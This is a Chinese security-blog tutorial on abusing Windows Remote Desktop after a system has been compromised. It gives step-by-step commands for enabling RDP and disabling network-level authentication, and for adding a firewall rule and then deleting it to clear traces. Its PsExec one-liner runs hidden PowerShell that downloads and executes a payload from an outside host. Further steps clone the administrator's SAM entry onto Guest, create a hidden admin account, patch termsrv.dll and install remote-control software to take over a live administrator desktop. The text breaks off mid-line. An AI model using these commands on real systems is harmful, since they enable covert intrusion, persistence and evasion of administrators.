---
title: Windows远程桌面的奇技淫巧
url: https://www.secpulse.com/archives/205196.html
source: 安全脉搏
date: 2025-01-15
fetch_date: 2025-10-06T20:09:14.961718
---

# Windows远程桌面的奇技淫巧

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# Windows远程桌面的奇技淫巧

[Web安全](https://www.secpulse.com/archives/category/articles/web)

[蚁景网安实验室](https://www.secpulse.com/newpage/author?author_id=37244)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng2.png)

2025-01-14

22,636

## 前言

* Windows远程桌面简介

远程桌面协议(RDP)是一个多通道(multi-channel)的协议，让使用者连上提供微软终端机服务的计算机(称为服务端或远程计算机)

* 远程桌面的前置条件

在获取权限后，针对3389进行展开，先查询3389端口是否开启

```
netstat -ano | findstr 3389
```

发现没有开启（也有可能更改了端口），则可以通过注册表进行手动启动（需要管理员权限）

```
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f      （开启）
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 11111111 /f      （关闭）
```

若执行失败，可能由于系统版本过旧（以下开启命令适用于Windows Server 2003之前系统）

```
wmic path Win32_TerminalServiceSetting where (__class = "Win32_TerminalServiceSetting") call SetAllowTSConnections 1（开启）
wmic path Win32_TerminalServiceSetting where (__class = "Win32_TerminalServiceSetting") call SetAllowTSConnections 0（关闭）
```

![](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202407081520513.png)

有些运维人员会勾选”仅允许使用网络级别的身份验证的远程桌面的计算机连接”选项，我们也可以通过注册表进行关闭，避免影响连接（开启同理0替换成1）

```
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
```

![](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202407081520515.png)

为了避免运维人员更改了RDP端口，可以确认下RDP端口

```
reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-Tcp" /V PortNumber
```

![](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202407081520516.png)

正常若是3389端口为0xd3d（默认是十六进制表示）

![](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202407081520517.png)

在这里还需要保证防火墙等安全设备没有禁止且相互之间网络必须相通，这里防火墙设置只允许单独端口放通，减少运维人员的警觉（只允许3389端口放通）

```
netsh advfirewall firewall add rule name="RemoteDesktop" protocol=TCP dir=in localport=3389 action=allow
```

通过命令删除防火墙的通行策略（清理痕迹）

```
netsh advfirewall firewall delete rule name="RemoteDesktop"
```

## 克隆账户接管administrator桌面

* **适用场景**

在无法获取明文密码或者Hash等凭据，但是想接管实时的administrator桌面

* **利用步骤**（默认情况下需要system权限）

在administrator权限下进行切换（利用PsExec工具进行powershell无文件落地上线system权限）

```
shell "PsExec64.exe -accepteula -s powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.108.132:8080/a'))""
```

（-accepteula同意最终用户许可协议End User License Agreement，否则会弹窗无法运行）

![](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202407081520518.png)

查询用户的SID，方便选择克隆对象（常克隆Guest用户，系统自带不易察觉且默认的SID为501）

![](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202407081520520.png)

这里克隆administrator用户为Guest用户，将SID为500（对应十六进制为0x1f4）的管理员账号的相关信息导出为admin.reg

```
regedit /e admin.reg HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users00001F4
```

![](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202407081520521.png)

将注册表文件下载到本地方便编辑（下载后默认在本地CS目录的下的download文件夹下，文件下载后需要重命名）

```
download admin.reg
```

![](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202407081520522.png)

将admin.reg文件的第三行HKEY\_LOCAL\_MACHINE\SAM\SAM\Domains\Account\Users00001F4中的“1F4”修改为Guest的SID为1F5（十六进制），并保存为new.reg（方便区分）

![](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202407081520523.png)

将new.reg重新上传到受害机中

![](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202407081520524.png)

导入编辑好的new.reg文件

```
regedit /s new.reg
```

修改Guest密码便于远程登录，并及时清理两个reg文件

```
net user Guest Admin@123
del /F C:\Users\Administrator\Desktop\admin.reg C:\Users\Administrator\Desktop\new.reg
```

![](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202407081520525.png)

此时直接进行远程登录Guest账户，其实是administrator账户的系统，成功接管！

![](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202407081520526.png)

## 新建隐藏管理员+远程软件+会话劫持组合拳接管administrator桌面

* **适用场景**

在无法获取明文密码或者Hash等凭据，但是想接管实时的administrator桌面

* **利用步骤**

添加新隐藏用户

```
net user yuzi$ Admin@123 /add
```

将新隐藏用户添加到管理员组

```
net localgroup administrators yuzi$ /add
```

此时直接进行远程登录隐藏账户，进行图形化操作

![](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202407081520527.png)

若遇到对方已有用户在线，可能会出现以下界面（Windows sever版本默认支持多用户同时在线，Windows其他版本不支持）

![](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202407081520529.png)

此时为了做到更加隐蔽的进行登录（强迫登录会使对方会话掉线），可以修改termsrv.dll文件实现，操作前要将所有权转移给本地管理员，向本地管理员组授予对termsrv.dll文件的“完全控制”权限（若是通过powershell无文件远控的形式执行如下命令可能会出现问题，则需要在可执行木马的远控场景执行命令）

```
takeown /F c:\Windows\System32\termsrv.dll /A
icacls c:\Windows\System32\termsrv.dll /grant Administrators:F
```

修改系统文件可能会导致系统不稳定，确保有原始termsrv.dll文件的备份

```
copy c:\Windows\System32\termsrv.dll termsrv.dll_backup
```

![](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202407081520530.png)

接下来将对方的c:\Windows\System32\termsrv.dll文件下载至本地

```
download c:\Windows\System32\termsrv.dll
```

在编辑dll前需要确认当前系统的版本号，查看Windows的版本号

```
powershell Get-ComputerInfo -Property WindowsVersion, OsName
```

![](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202407081520531.png)

通过十六进制文本编辑器进行编辑termsrv.dll文件，按照不同的Windows的版本查找对应的字符串标识，替换为B8 00 01 00 00 89 81 38 06 00 00 90

![01.png](https://www.yijinglab.com/headImg.action?news=0b7b8460-2a42-4a7d-80a9-39c1a5e6bbbd.png)

![](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202407081520532.png)

修改完成后上传至对方，进行强制替换系统自带的termsrv.dll，（替换前需要先停止远程服务，以免发生冲突，替换后再重新启用远程服务）

```
net stop TermService /y
copy /y C:\Users\Administrator\Desktop\termsrv.dll c:\windows\system32\termsrv.dll
net start TermService
```

![](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202407081520533.png)

重新进行3389远程连接，发现已经可以直接登录到新建隐藏管理员桌面，不再出现提示页面

![](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202407081520534.png)

借助Windows的特性，直接在新建隐藏管理员桌面安装轻量级的远控桌面软件并运行（这里以GotoHTTP为例）

![](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202407081520535.png)

在攻击机本地进行GotoHTTP远程桌面时候，发现已经成功接管了administrator的实时桌面（由于GotoHTTP是以管理员身份运行的故显示的administrator桌面）

![](https...